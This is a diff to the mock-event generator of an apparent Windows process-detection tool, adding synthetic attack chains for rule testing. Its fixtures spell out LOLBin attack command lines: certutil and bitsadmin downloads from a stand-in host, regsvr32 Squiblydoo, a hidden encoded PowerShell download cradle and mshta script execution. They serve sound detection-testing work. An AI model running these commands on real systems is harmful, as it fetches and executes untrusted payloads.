@@ -169,7 +169,7 @@ class ProcessCollector:
                 logger.error("Failed to persist event (PID %d) to SQLite: %s", event.pid, exc)
 
     def _stream_mock_events(self) -> Iterator[ProcessEvent]:
-        """Yield synthetic Windows process creation events testing core LOLBin rules."""
+        """Yield synthetic process events testing single-event rules and multi-event attack chains."""
         sample_events = [
             # 1. Benign background service
             ProcessEvent(
@@ -182,53 +182,92 @@ class ProcessCollector:
                 integrity_level="System",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 2. Rule 1 & Rule 2: Office application (winword.exe) spawning certutil with -urlcache and http://
+            # 2. Chain 1 (Stage 1) & Single Rule: Download Cradle via certutil
             ProcessEvent(
                 pid=6832,
                 ppid=3912,
                 image=r"C:\Windows\System32\certutil.exe",
                 command_line=(
                     r"certutil.exe -urlcache -split -f "
-                    r"http://198.51.100.42/payload.bin C:\ProgramData\update.bin"
+                    r"http://198.51.100.42/payload.bin C:\ProgramData\update.sct"
                 ),
                 user=r"WORKSTATION\StandardUser",
-                parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
+                parent_image=r"C:\Windows\System32\cmd.exe",
                 integrity_level="Medium",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 3. Rule 3: Suspicious bitsadmin download transfer from external URL
+            # 3. Chain 1 (Stage 2) & Single Rule: Execution of staged scriptlet via regsvr32 (Squiblydoo)
+            # Completes SEQ-CHAIN-001 (Download -> Execute)
+            ProcessEvent(
+                pid=6900,
+                ppid=3912,
+                image=r"C:\Windows\System32\regsvr32.exe",
+                command_line=r"regsvr32.exe /s /n /u /i:C:\ProgramData\update.sct scrobj.dll",
+                user=r"WORKSTATION\StandardUser",
+                parent_image=r"C:\Windows\System32\cmd.exe",
+                integrity_level="Medium",
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
+            # 4. Chain 2 (Stage 1) & Single Rule: Initial LOLBin staging via bitsadmin
             ProcessEvent(
                 pid=7050,
                 ppid=2210,
                 image=r"C:\Windows\System32\bitsadmin.exe",
                 command_line=(
                     r"bitsadmin.exe /transfer updateJob /download /priority high "
-                    r"http://198.51.100.42/stage2.exe C:\ProgramData\stage2.exe"
+                    r"http://198.51.100.42/stage2.bin C:\ProgramData\stage2.bin"
                 ),
-                user=r"WORKSTATION\StandardUser",
+                user=r"WORKSTATION\SecurityOps",
                 parent_image=r"C:\Windows\System32\cmd.exe",
                 integrity_level="Medium",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 4. Rule 4: Mshta executing inline javascript
+            # 5. Chain 2 (Stage 2): Encoded PowerShell invocation by same user following LOLBin
+            # Completes SEQ-CHAIN-002 (LOLBin -> Encoded PowerShell)
             ProcessEvent(
-                pid=7100,
-                ppid=7050,
-                image=r"C:\Windows\System32\mshta.exe",
-                command_line=r'mshta.exe javascript:a=new(ActiveXObject)("WScript.Shell");a.Run("calc.exe",0);close()',
-                user=r"WORKSTATION\StandardUser",
+                pid=7080,
+                ppid=2210,
+                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                command_line=(
+                    r"powershell.exe -NoP -W Hidden -Enc "
+                    r"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
+                ),
+                user=r"WORKSTATION\SecurityOps",
                 parent_image=r"C:\Windows\System32\cmd.exe",
                 integrity_level="Medium",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
-            # 5. Rule 5: Regsvr32 Squiblydoo proxy execution loading remote scriptlet via scrobj.dll
+            # 6. Chain 3 (Stage 1): Command Shell Root (cmd.exe)
             ProcessEvent(
-                pid=8104,
-                ppid=6120,
-                image=r"C:\Windows\System32\regsvr32.exe",
-                command_line=r"regsvr32.exe /s /n /u /i:http://198.51.100.42/backdoor.sct scrobj.dll",
+                pid=8000,
+                ppid=1200,
+                image=r"C:\Windows\System32\cmd.exe",
+                command_line=r"cmd.exe /c start-stage.bat",
                 user=r"WORKSTATION\AdminUser",
                 parent_image=r"C:\Windows\explorer.exe",
+                integrity_level="High",
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
+            # 7. Chain 3 (Stage 2): cmd.exe (PID 8000) spawns powershell.exe (PID 8100)
+            ProcessEvent(
+                pid=8100,
+                ppid=8000,
+                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                command_line=r"powershell.exe -ExecutionPolicy Bypass -File .\script.ps1",
+                user=r"WORKSTATION\AdminUser",
+                parent_image=r"C:\Windows\System32\cmd.exe",
+                integrity_level="High",
+                creation_time=datetime.now(timezone.utc).isoformat(),
+            ),
+            # 8. Chain 3 (Stage 3): powershell.exe (PID 8100) spawns mshta.exe (PID 8200)
+            # Completes SEQ-CHAIN-003 (cmd -> powershell -> LOLBin cascade)
+            ProcessEvent(
+                pid=8200,
+                ppid=8100,
+                image=r"C:\Windows\System32\mshta.exe",
+                command_line=r'mshta.exe javascript:a=new(ActiveXObject)("WScript.Shell");a.Run("calc.exe",0);close()',
+                user=r"WORKSTATION\AdminUser",
+                parent_image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                 integrity_level="High",
                 creation_time=datetime.now(timezone.utc).isoformat(),
             ),
